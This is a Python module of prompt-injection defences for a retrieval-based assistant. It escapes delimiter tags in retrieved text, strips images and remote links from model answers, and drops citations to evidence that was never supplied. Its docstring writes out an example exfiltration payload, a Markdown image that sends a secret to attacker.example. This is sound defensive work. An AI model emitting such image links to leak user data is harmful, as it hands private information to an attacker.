"""Prompt-injection defences at the text level (guide step 4.6, design §8.7).

1. Retrieved text enters prompts as escaped, delimited data with an id the model must cite.
2. Model answers are post-processed: remote images and links are removed (exfiltration via Markdown images:
   ``![x](https://attacker.example/?d=<secret>)``), and citations to evidence ids that were not supplied are
   dropped. The UI additionally renders no remote images under CSP ``img-src 'self'``.
"""

from __future__ import annotations

import re

_TAG = re.compile(r"</?\s*(document|evidence|system|instructions?)\b[^>]*>", re.IGNORECASE)


def escape_data(text: str) -> str:
    """Neutralise anything that looks like our delimiters so a document cannot close its own data block."""
    return _TAG.sub(lambda m: m.group(0).replace("<", "‹").replace(">", "›"), text)


def wrap_document(doc_id: str, text: str) -> str:
    return f'<document id="{doc_id}">\n{escape_data(text)}\n</document>'


_MD_IMAGE = re.compile(r"!\[([^\]]*)\]\(\s*<?([^)\s>]+)>?(?:\s+\"[^\"]*\")?\s*\)")
_MD_LINK = re.compile(r"(?<!!)\[([^\]]+)\]\(\s*<?((?:https?:)?//[^)\s>]+)>?(?:\s+\"[^\"]*\")?\s*\)")
_HTML_IMG = re.compile(r"<\s*img\b[^>]*>", re.IGNORECASE)
_REF_IMAGE = re.compile(r"^\s*\[[^\]]+\]:\s*\S+.*$", re.MULTILINE)
_BARE_URL = re.compile(r"https?://[^\s)>\]]+", re.IGNORECASE)


def strip_exfiltration(answer: str, allowed_hosts: frozenset[str] = frozenset()) -> tuple[str, int]:
    """Remove image syntax entirely and turn remote links into plain text. Returns (clean, removed_count)."""
    removed = 0

    def _img(m: re.Match[str]) -> str:
        nonlocal removed
        removed += 1
        alt = m.group(1) if m.re.groups else ""
        return f"[image removed: {alt}]" if alt else "[image removed]"

    def _link(m: re.Match[str]) -> str:
        nonlocal removed
        host = re.sub(r"^(?:https?:)?//", "", m.group(2)).split("/")[0].lower()
        if host in allowed_hosts:
            return m.group(0)
        removed += 1
        return m.group(1)

    out = _MD_IMAGE.sub(_img, answer)
    out = _HTML_IMG.sub(_img, out)
    out = _MD_LINK.sub(_link, out)
    out, n = _REF_IMAGE.subn("", out)
    removed += n

    def _bare(m: re.Match[str]) -> str:
        nonlocal removed
        url = m.group(0)
        host = re.sub(r"^https?://", "", url, flags=re.IGNORECASE).split("/")[0].lower()
        if host in allowed_hosts or ("?" not in url and "=" not in url):
            return url
        removed += 1  # a URL carrying a query string is the exfiltration shape
        return "[link removed]"

    out = _BARE_URL.sub(_bare, out)
    return out, removed


_CITE = re.compile(r"\[(\d{1,3})\]")


def cited_indices(answer: str) -> list[int]:
    seen: dict[int, None] = {}
    for m in _CITE.finditer(answer):
        seen.setdefault(int(m.group(1)), None)
    return list(seen)


def drop_unknown_citations(answer: str, valid: set[int]) -> tuple[str, list[int]]:
    """Remove citation markers that point at evidence the model was never given."""
    dropped: list[int] = []

    def _fix(m: re.Match[str]) -> str:
        n = int(m.group(1))
        if n in valid:
            return m.group(0)
        dropped.append(n)
        return ""

    return _CITE.sub(_fix, answer), dropped
